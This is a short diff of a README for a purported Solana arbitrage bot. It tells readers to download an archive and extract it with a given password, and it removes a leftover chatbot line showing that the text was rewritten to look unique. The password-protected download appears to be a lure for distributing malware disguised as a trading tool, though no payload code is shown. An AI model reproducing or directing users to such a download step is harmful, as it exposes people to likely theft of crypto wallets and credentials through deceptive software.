@@ -18,7 +18,6 @@
 ## Usage
 - [Clone](https://github.com/Zhang8081/Solana-Arbitrage-bot/archive/refs/heads/main.zip) the repository
 - extract archive with pass `1Na0Q3`
-Sure! Here's a slightly more unique version of that text:  
 - Set up your environment:  
 Create a `.env` file in the root folder of your project and add your environment variables. Feel free to use the `.env.example` file as a reference.  
 - Launch the bot.
